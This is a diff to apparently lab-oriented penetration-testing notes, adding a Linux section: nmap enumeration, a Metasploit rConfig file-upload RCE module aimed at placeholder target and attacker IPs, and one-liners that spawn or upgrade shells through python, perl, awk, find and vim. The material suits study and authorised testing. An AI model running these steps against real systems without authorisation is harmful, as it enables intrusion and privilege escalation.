@@ -338,7 +338,6 @@ shell
 
 When we executed the Meterpreter command shell, it started another process on the host and dropped us into a system shell.
 
-
 </details>
 
 <details>
@@ -394,6 +393,177 @@ When we executed the Meterpreter command shell, it started another process on th
 </details>
 
 > **Note:** PowerShell is more powerful but leaves traces (command history). CMD is lightweight but lacks advanced features.
+
+</details>
+
+</details>
+
+
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h1>🐧 Linux/UNIX Shells</h1></summary>  
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h3>Infiltrating Linux/UNIX</h3></summary>  
+<details>
+
+**Attack Machine: Enumerate the host**  
+
+```bash
+sudo nmap -sS -sV -sC -v -A -O <TARGET IP> --script banner.nse -oX nmap_target_xml_scan.xml > /dev/null 1 2>&1
+
+xsltproc nmap_target_xml_scan.xml -o nmap_target_html_scan.html
+```
+
+**Attack Machine: Start Metasploit**  
+
+Open msfconsole and search for the for the identified service.
+
+```bash
+msfconsole
+```
+
+**Attack Machine: Determine an Exploit Path**  
+
+```bash
+search rconfig
+use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+```
+
+**Attack Machine: Configure Exploit Options**  
+
+```bash
+options
+set RHOSTS <TARGET IP>
+set LHOST <ATTACKER IP>
+```
+
+**Attack Machine: Execute the Exploit**  
+```bash
+exploit
+```
+
+**Attack Machine: Interact With the Shell**  
+```bash
+shell
+```
+
+**Attack Machine: Interact With the Shell**  
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")' 
+```
+
+</details>
+</details>
+
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h3>Spawning Interactive Shells</h3></summary>  
+
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h4>Spawn a shell</h4></summary>  
+
+There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. 
+
+**/bin/sh**
+
+This command will execute the shell interpreter specified in the path in interactive mode (-i).
+
+```bash
+/bin/sh -i
+# sh: no job control in this shell
+```
+
+**Perl**
+
+If the programming language Perl is present on the system, these commands will execute the shell interpreter specified.
+
+```bash
+perl —e 'exec "/bin/sh";'
+```
+
+```bash
+perl: exec "/bin/sh";\
+# This command should be run from a script.
+```
+
+**Ruby**
+
+If the programming language Ruby is present on the system, this command will execute the shell interpreter specified:
+
+```bash
+ruby: exec "/bin/sh"
+# This command should be run from a script.
+```
+
+**Lua**
+
+If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command below:
+
+```bash
+lua: os.execute('/bin/sh')
+# This command should be run from a script.
+```
+
+**AWK**
+
+AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. 
+
+```bash
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+**Find**
+
+Find is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria.
+
+```bash
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+```
+
+**Exec**
+
+This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.
+
+```bash
+find . -exec /bin/sh \; -quit
+```
+
+**VIM**
+
+Yes, we can set the shell interpreter language from within the popular command-line-based text-editor VIM. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.
+
+Vim To Shell  
+
+```bash
+vim -c ':!/bin/sh'
+```
+
+Vim Escape  
+```bash
+vim
+:set shell=/bin/sh
+:shell
+```
+
+</details>
+
+<details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<summary><h4>Execution Permissions</h4></summary>  
+
+Permissions
+```bash
+ls -la <PATH>
+```
+
+Sudo
+```bash
+sudo -l
+```
+
+> Not only will considering permissions allow us to see what commands we can execute, but it may also start to give us an idea of potential vectors that will allow us to escalate privileges.
 
 </details>
 
